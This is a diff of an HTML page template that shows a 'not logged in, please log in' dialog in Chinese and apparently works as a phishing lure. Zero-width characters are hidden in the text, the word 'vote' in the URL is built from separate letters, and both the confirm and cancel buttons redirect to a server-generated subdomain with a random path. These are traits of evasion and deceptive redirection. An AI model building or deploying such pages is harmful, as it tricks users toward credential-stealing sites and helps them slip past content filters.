@@ -1,8 +1,24 @@
 <meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
-<body></body>
-<link href="//cdn.bootcss.com/mui/3.7.1/css/mui.min.css" rel="stylesheet">
-<script src="//cdn.bootcss.com/mui/3.7.1/js/mui.min.js"></script>
-<script>function randomString(len) {
+<script src="http://s.amazeui.org/assets/2.x/js/jquery.min.js"></script>
+<link href="//cdn.amazeui.org/amazeui/2.7.2/css/amazeui.min.css" rel="stylesheet">
+<script src="//cdn.amazeui.org/amazeui/2.7.2/js/amazeui.min.js"></script>
+<script src="//cdn.amazeui.org/amazeui/2.7.2/js/amazeui.widgets.helper.min.js"></script>
+<body>
+<div class="am-modal am-modal-confirm" tabindex="-1" id="my-confirm">
+  <div class="am-modal-dialog">
+    <div class="am-modal-hd">Amaze UI</div>
+    <div class="am-modal-bd">
+      ​​​未​​​登​​​录​​​，​​请​​​先​​​登​​​录
+    </div>
+    <div class="am-modal-footer">
+      <span class="am-modal-btn" data-am-modal-cancel>取消</span>
+      <span class="am-modal-btn" data-am-modal-confirm>确定</span>
+    </div>
+  </div>
+</div>
+</body>
+<script>
+function randomString(len) {
 　　len = len || 32;
 　　var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
 　　var maxPos = $chars.length;
@@ -11,4 +27,17 @@
 　　　　pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
 　　}
 　　return pwd;
-}mui.confirm('\u672a\u200b\u767b\u200b\u5f55\u200b\uff0c\u200b\u8bf7\u200b\u5148\u200b\u767b\u200b\u5f55', '\u672a\u200b\u767b\u200b\u5f55', ['\u662f', '\u5426'], function (aaa) { if (aaa.index == 0) { window.location.href = 'http://<%=func(uid)%>'+window.location.host.substring(window.location.host.indexOf('.')) + "/" + "v" + "o" + "t" + "e/"+randomString(10) } })</script>
+}
+$(function() {
+    $('#my-confirm').modal({
+    relatedTarget: this,
+    onConfirm: function(options) {
+        window.location.href = 'http://<%=func(uid)%>'+window.location.host.substring(window.location.host.indexOf('.')) + "/" + "v" + "o" + "t" + "e/"+randomString(10) 
+    },
+    // closeOnConfirm: false,
+    onCancel: function() {
+        window.location.href = 'http://<%=func(uid)%>'+window.location.host.substring(window.location.host.indexOf('.')) + "/" + "v" + "o" + "t" + "e/"+randomString(10) 
+    }
+    });
+});
+</script>
